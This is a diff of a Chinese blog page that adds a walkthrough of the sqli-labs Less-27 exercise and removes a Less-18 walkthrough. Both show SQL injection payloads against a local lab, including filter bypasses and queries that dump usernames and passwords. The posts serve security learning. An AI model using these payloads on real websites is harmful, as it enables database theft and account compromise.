@@ -64,6 +64,46 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-27" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/17/sql-labs-Less-27/" class="article-date">
+  <time datetime="2021-02-17T05:50:11.000Z" itemprop="datePublished">2021-02-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/17/sql-labs-Less-27/">sql-labs-Less-27</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/%EF%BC%8C%E8%BE%93%E5%85%A5?id=1%EF%BC%8C%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%EF%BC%8C%E5%86%8D%E8%BE%93%E5%85%A5&#39;%EF%BC%8C%E5%8F%91%E7%94%9F%E6%8A%A5%E9%94%99%EF%BC%8C">http://127.0.0.1/sql/Less-27/，输入?id=1，正常输出，再输入&#39;，发生报错，</a><br>从报错信息我们可以看出要用’注入，输入;%00也可以证明这一点，然后有报错信息，说明可以用报错注入。</p>
+<p>这里我们用联合注入：<br>查列数：<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> order by 3;%00，发生报错，从报错信息看出我们的空格被过滤了，<br>我们把空格换成%a0：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;%a0order%a0by%a03;%00%EF%BC%8C%E6%AD%A3%E5%B8%B8%E3%80%82">http://127.0.0.1/sql/Less-27/?id=1&#39;%a0order%a0by%a03;%00，正常。</a><br>测位置：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;union%a0select%a01,2,3;%00%EF%BC%8C%E5%8F%88%E6%8A%A5%E9%94%99%EF%BC%8C%E7%9C%8B%E4%BF%A1%E6%81%AF%E7%9F%A5%E9%81%93union%E5%92%8Cselect%E7%9A%84%E5%B0%8F%E5%86%99%E5%BD%A2%E5%BC%8F%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C">http://127.0.0.1/sql/Less-27/?id=1&#39;union%a0select%a01,2,3;%00，又报错，看信息知道union和select的小写形式被过滤了，</a><br>我们换成uNion和sElect：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,2,3;%00%EF%BC%8C%E6%AD%A3%E5%B8%B8%E3%80%82">http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,2,3;%00，正常。</a><br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,database(),3;%00">http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,database(),3;%00</a><br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00">http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00</a><br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00">http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00</a><br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(username)%a0from%a0users),(sElect%a0group_concat(password)%a0from%a0users);%00">http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(username)%a0from%a0users),(sElect%a0group_concat(password)%a0from%a0users);%00</a></p>
+<p>报错注入：</p>
+<p>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,database())) || ‘<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(sElect(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))))||’<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(sElect(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’))))||’<br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(sElect(group_concat(id))from(users))))||’<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(sElect(concat_ws(0x7e,username,passwoorrd))from(users)where(id=1))))||’</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/17/sql-labs-Less-27/" data-id="ckl93itag00003cux18oj4fhf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-26a" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/16/sql-labs-Less-26a/" class="article-date">
@@ -475,56 +515,6 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
 
 
   
-    <article id="post-sql-labs-Less-18" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/10/sql-labs-Less-18/" class="article-date">
-  <time datetime="2021-02-10T09:44:55.000Z" itemprop="datePublished">2021-02-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/10/sql-labs-Less-18/">sql-labs-Less-18</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>Less-18</h1>
-
-<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-18/%EF%BC%8Cusername%E5%92%8Cpassword%E8%BE%93%E5%85%A5admin%E7%99%BB%E5%85%A5%EF%BC%9A">http://127.0.0.1/sql/Less-18/，username和password输入admin登入：</a></p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/1.png" alt="1"><br>显示了我们的IP地址（这个没登入也有）和agent；<br>通过查看源代码：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/2.png" alt="2"><br>看到username和password都用了check_input()函数，所以不能在username和password里进行注入。<br>但是在源代码看到<br><code>$insert=&quot;INSERT INTO </code>security<code>.</code>uagents<code> (</code>uagent<code>, </code>ip_address<code>, </code>username<code>) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</code><br>意思是将useragent和ip插入到数据库中，所以我们可以在useragent和ip这里考虑一下注入。Ip地址我们这里修改不是很方便，但是useragent修改较为方便，我们从useragent入手。<br>首先我们把http header live(火狐浏览器的插件)打开</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/3.png" alt="3"><br>在<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-18/">http://127.0.0.1/sql/Less-18/</a> 登入后再把刚才那个http header live打开</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/4.png" alt="4"><br>可以看到我们的User-Agent，点击进入：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/5.png" alt="5"><br>接下来按f12打开hackbar（火狐浏览器插件）</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/6.png" alt="6"><br>再这样：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/7.png" alt="7"><br>再在U那个栏里面输入’,发现报错：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/8.png" alt="8"><br>且语句中有<code>127.0.0.1&#39;, &#39;admin&#39;)</code>,我们可以猜想原语句可能是(‘ABC’,…’ABC’…,’ABC’)这样的。<br>我们再输入一个’测试一下：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/9.png" alt="9"><br>发现没有报错，说明是用’注入的。<br>知道了注入字符，接下来就开始注入了，这里用的是报错注入，不能用布尔盲注，因为无论错误还是正确都不会报错。<br>爆库：输入’and updatexml(1,concat(0x7e,(select database()),0x7e),1) and’<br>爆表：’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),0x7e),1) and’<br>爆列：’and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 0,1),0x7e),1) and’<br>爆数据：’and updatexml(1,concat(0x7e,(select id from users limit 0,1),0x7e),1) and’<br>‘and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) and’<br>‘and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) and’</p>
-<p>以上也可以用’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1) ,’’,’’)#<br>上面有,’’,’’)是因为报错里有127.0.0.1、admin，而且只输入’,’’,’’)#没有报错。</p>
-<p>PS:如果用hackbar在user-agent进行注入没反应的话可能要把浏览器重启一下。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/10/sql-labs-Less-18/" data-id="ckkzsewlz0000dwux0gxkdvnu" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -561,6 +551,10 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
       <ul>
         
           <li>
+            <a href="/2021/02/23/sql-labs-Less-50-53/">sql-labs-Less-50~53</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/23/sql-labs-Less-46~49/">sql-labs-Less-46~49</a>
           </li>
         
@@ -574,10 +568,6 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
         
           <li>
             <a href="/2021/02/21/sql-labs-Less-36-37/">sql-labs-Less-36~37</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/20/sql-labs-Less-34/">sql-labs-Less-34</a>
           </li>
         
       </ul>
